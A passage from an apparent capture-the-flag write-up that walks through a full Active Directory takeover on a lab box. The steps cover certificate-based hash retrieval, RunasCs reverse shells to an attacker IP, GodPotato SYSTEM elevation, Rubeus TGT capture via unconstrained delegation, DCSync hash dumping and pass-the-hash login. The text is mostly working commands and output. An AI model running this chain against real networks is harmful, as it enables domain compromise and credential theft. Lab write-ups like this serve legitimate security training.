certipy-ad auth -pfx cert.pfx -u svc_sql -domain darkzero.ext -dc-ip 172.16.20.2
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'svc_sql@darkzero.ext'
[*]     Security Extension SID: 'S-1-5-21-1969715525-31638512-2552845157-1103'
[*] Using principal: 'svc_sql@darkzero.ext'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_sql.ccache'
[*] Wrote credential cache to 'svc_sql.ccache'
[*] Trying to retrieve NT hash for 'svc_sql'
[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
```
### Password Change for Logon Type Manipulation
To obtain a full-privilege token, we need a Type 5 (Service) logon. First, change the account password:
```
impacket-changepasswd svc_sql@darkzero.ext -hashes :816ccb849956b531db139346751db65f -newpass 'Pass!@#' -dc-ip 172.16.20.2
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of Builtin\svc_sql
[*] Connecting to DCE/RPC as Builtin\svc_sql
[*] Password was changed successfully.
```
## Achieving Full Privilege Token

### Technical Concept: RunasCs and Logon Types

**RunasCs** is an improved version of Windows `runas` that supports specifying logon types. Critical for our scenario:

```
# Type 5 (Service Logon) - Produces FULL token with SeImpersonatePrivilege
PS C:\.temp> .\RunasCs.exe svc_sql 'Pass!@#' powershell -l 5 -b -r 10.10.14.76:9003

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-298b8$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3328 created in background.
[+] Got reverse shell from DC02~10.129.2.3-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC 😍️ Assigned SessionID <2>
PS C:\.temp>
```

**Why This Works:**

- `-l 5` specifies **LOGON32_LOGON_SERVICE**
- Service logons initialize the token with ALL privileges assigned to the account    
- Network logon restrictions do not apply
**Verification - Privileges Restored:**

```
PS C:\Windows\system32> whoami
whoami
darkzero-ext\svc_sql
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\Windows\system32>
```

**Success**: SeImpersonatePrivilege is now present and enabled.

### Elevation to SYSTEM with GodPotato
With SeImpersonatePrivilege, we can leverage potato-style attacks to elevate to SYSTEM:

```
PS C:\.temp> .\GodPotato-NET4.exe -cmd "cmd /c net user Administrator Pass!@#"
.\GodPotato-NET4.exe -cmd "cmd /c net user Administrator Pass!@#"
[*] CombaseModule: 0x140715409080320
[*] DispatchTable: 0x140715411667272
[*] UseProtseqFunction: 0x140715410962608
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\020e54bf-5bcf-4303-b860-a02f6268ec75\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000a802-0d98-ffff-0be5-0272614ef73b
[*] DCOM obj OXID: 0x41931166c35f9035
[*] DCOM obj OID: 0xa051a2d9bfadd18c
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1008 Token:0x740  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3108
The command completed successfully.

PS C:\.temp>
```

**Administrator password changed to `Pass!@#`**
### Administrative Access

Using RunasCs again with the updated administrator credentials:

```
PS C:\.temp> .\RunasCs.exe Administrator 'Pass!@#' powershell -r 10.10.14.76:9004
.\RunasCs.exe Administrator 'Pass!@#' powershell -r 10.10.14.76:9004

[+] Running in session 0 with process function CreateProcessWithTokenW()
[+] Using Station\Desktop: Service-0x0-298b8$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3220 created in background.
[+] Got reverse shell from DC02~10.129.2.3-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC 😍️ Assigned SessionID <3>
PS C:\.temp> 
```

**User Flag**: `C:\Users\Administrator\Desktop\user.txt`
## Domain Compromise via Unconstrained Delegation

### Technical Concept: Unconstrained Delegation

**Unconstrained Delegation** is a Kerberos feature that allows a service to impersonate users to **any** service on **any** system. When enabled:
1. The service account's TGT is sent along with the service ticket
2. The receiving service can extract and cache the TGT
3. This TGT can then be used to impersonate the user to any other service
**Detection**: `TrustedForDelegation = True` on the computer object

### Verification of Delegation Status

```
PS C:\Users\administrator\Desktop> Get-ADComputer -Identity $env:COMPUTERNAME -Properties TrustedForDelegation,TrustedToAuthForDelegation
Get-ADComputer -Identity $env:COMPUTERNAME -Properties TrustedForDelegation,TrustedToAuthForDelegation


DistinguishedName          : CN=DC02,OU=Domain Controllers,DC=darkzero,DC=ext
DNSHostName                : DC02.darkzero.ext
Enabled                    : True
Name                       : DC02
ObjectClass                : computer
ObjectGUID                 : f85520d0-db6e-4a92-9ebc-f01d6d4cc268
SamAccountName             : DC02$
SID                        : S-1-5-21-1969715525-31638512-2552845157-1000
TrustedForDelegation       : True
TrustedToAuthForDelegation : False
UserPrincipalName          : 



PS C:\Users\administrator\Desktop> 
```

**Critical Finding**: DC02 has unconstrained delegation enabled - a severe misconfiguration for a domain controller.

### TGT Capture with Rubeus

Rubeus monitors for TGTs sent to our compromised host:

```
PS C:\.temp> .\Rubeus.exe monitor /interval:5
[*] Monitoring every 5 seconds for new TGTs
<....SNIP...>
```
### Triggering TGT Transmission

Forcing authentication from DC01$ to our controlled host via MSSQL:

```
impacket-mssqlclient DC01.darkzero.htb/john.w:'RFulUtONCOL!'@10.129.2.3 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands 
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\sfsdafasd
subdirectory   depth   file   
------------   -----   ----   
SQL (darkzero\john.w  guest@master)> 
```

**Result**: TGT for DC01$ captured by Rubeus:

```

[*] Ticket cache size: 5


[*] 2/12/2026 10:36:26 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  2/12/2026 10:36:26 PM
  EndTime               :  2/13/2026 8:36:25 AM
  RenewTill             :  2/19/2026 10:36:25 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRn
    dBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZIv198z0lbXvBSStSINVmyLLGlwGqiuNseCwlnFlt50szF
    Zhuwc4Bhe9c5BpJML2q2zxUW6n82g71IRXHN1VA31rGNGL4dCIuAbtgagl8Mbo9iw0ac5D6iAbjIr3obaFr7tNNM/YMvdeoVkgm5
    kvbAWqTGLIBz7wt1QCyvGj7ruChPQW4v5N2AL+yGzlKFvjBSxO+K6s70aFBVdoLOtaJi5899Fz71tCeRQ8EN1SPFTaiLa9q4mIz/
    PzykpxkKSE+Dn6bnpkH40xse8dV8YmarBBc2OZ2J9dVd6CQwl7+bXgxuXaFjxelUgla/h6WGf6mNSZq9RryYVa9nmyG6A7bPIdSY
    t8js8T0k1ynNdgvKUMI6O1qcekWqHPnGn1B9Lg0z0S9FmcSoTL6d/BiXS/03ZkJLMkVt0RdRTNDrjCUwt4hLN4Vs0E7PogTiF/7h
    7q3trJsAORs2KJ/f4HB1y5WHTn60+k3DSuISdJze5dFZjTC6FV1qxzmF8aZGj0dBnIChNjPoXCzcarDdpeQiqPLCNJRYwWVwJfmz
    C4rTddx40gEaDWTLNgQDPDZFxBsheQ51Ku0YsEugwOGyqs1OlLzvcxBmndqcEQzWBfe2oC2mzMQIinlKVxRcC5t3dVpTYfaWTakZ
    rV0+Zr1sJiiZzqDgNQBYMePVylECRiN4LYYoHUbRnIJcrbFOGTIkU8bhgz2FalBytiHtoj2FuB5PvUUrymleJ9o1zH8Vik8s4ep/
    Mdz8GVfUkvQcZ3zmnUZnHFanCR0ZEl4ZxmPVhbpP4+Df041Jlaii/H1jgEa/YZd6kzXXsNOKyq9MKtBVl+u6iYjnmTKtmk+AaImn
    gA1n6ls8VZSrsBDFWPe9Us/SpIOoGa1o0D1YV8HpblBVO7eJtrqGrNg3xFwwldV2u1BYJBMENtVl2q60w4V42OT/hWKry0d+ljky
    kpJTAZj4oC30DLGN8uLM5vi33FGlEtyYDEH5c/6kJBWnyiRp6APJ7VLyIfiNTDQ0JqWl2rLbVgy73e1SXnxfzXzWs7JdxMEOoB2e
    Gi1/ziTJhf1xu/u2ZqZBgK9WMs62l6Nm36as7jQ4FIAi58b73mDYLm4XADH0YxhOPbVEXqLFxGeCgfrSqf5nwsp4562AOmfs7M6i
    xQehrx532YghnT+lPskmwMFE/Hu2ULc+vc60Jm7+OZpKv4QRysj54TiV5twodf7rtGq9gX8UDr0N8OI5E85Hsjmb/EQOtYQvDwLV
    99zZejdMUsN6u6ohWcZ/rtg75i1tS43TGSKcSh8cIQ/tj3nzgaHfr7f2Ul1oGY9TlaqDT1G4mgRgngPf4P3D74S/9d3MnVerB1G2
    KlFugdCsF8zE/bEIwa8+tMWOgCdnWv4xaSgypRqCFKyS0MCEwGS8wD5tR1uoUwR4tsuyrd/Mi53FAE4ayTJGSI5CGbOWo4HjMIHg
    oAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgk7WaFS0Vo02i1YlF+7B4i4MWEoNk7Lt7ZN1V3ym8rmqhDhsM
    REFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNjAyMTIyMjM2MjZaphEYDzIwMjYwMjEzMDgz
    NjI1WqcRGA8yMDI2MDIxOTIyMzYyNVqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 6
```
### Ticket Conversion and DCSync Attack

Converting the captured Kirbi ticket to ccache format:

```
echo "<base64_ticket>" | base64 -d > dc01_ticket.kirbi
impacket-ticketConverter  ticket.kirbi dc01_admin.ccache 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
export KRB5CCNAME=dc01.ccache
```

**Verification**:

```
export Kexport KRB5CCNAME=dc01_admin.ccache
klist                                      
Ticket cache: FILE:dc01_admin.ccache
Default principal: DC01$@DARKZERO.HTB

Valid starting       Expires              Service principal
02/13/2026 01:36:26  02/13/2026 11:36:25  krbtgt/DARKZERO.HTB@DARKZERO.HTB
        renew until 02/20/2026 01:36:25
```

With the domain controller's TGT, we can perform a DCSync attack to extract all domain hashes:

```
impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:17db458bcf796074e34a4d0967b12af9:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:f9cab478b7073c5e5cb01619051d69ccee578e2c4c1fcb22d134f8d0f55fa6d9
darkzero-ext$:aes128-cts-hmac-sha1-96:d0a7edea3869a7a15ca7f866b3ba1722
darkzero-ext$:0x17:17db458bcf796074e34a4d0967b12af9
[*] Cleaning up... 
```
### Final Domain Admin Access

Using Evil-WinRM with the extracted hash:

```
evil-winrm -i darkzero.htb -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

**Root Flag**: `C:\Users\Administrator\Desktop\root.txt`
## Attack Chain Summary

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   Initial       │     │  Database Link  │     │   Service       │
│   Credentials   │────▶│   Impersonation │────▶│   Account Shell │
│   john.w        │     │   dc01_sql_svc  │     │   svc_sql       │
└─────────────────┘     └─────────────────┘     └─────────────────┘
                                                       │
                                                       ▼
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   AD CS ESC1    │     │   Logon Type 5  │     │   Restricted    │
│   Certificate   │────▶│   Token Fix     │────▶│   Token (Type3) │
│   Request       │     │   RunasCs -l 5  │     │   xp_cmdshell   │
└─────────────────┘     └─────────────────┘     └─────────────────┘
        │                                                   │
        ▼                                                   ▼
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   NTLM Hash     │     │   GodPotato     │     │   Full Token    │
│   Extraction    │────▶│   SYSTEM        │────▶│   w/ SeImp      │
│   Certipy       │     │   Elevation     │     │   Privilege     │
└─────────────────┘     └─────────────────┘     └─────────────────┘
                                                       │
                                                       ▼
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   Unconstrained │     │   DCSync via    │     │   Domain Admin  │
│   Delegation    │────▶│   DC01$ TGT     │────▶│   Compromise    │
│   Rubeus        │     │   secretsdump   │     │   Evil-WinRM    │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```
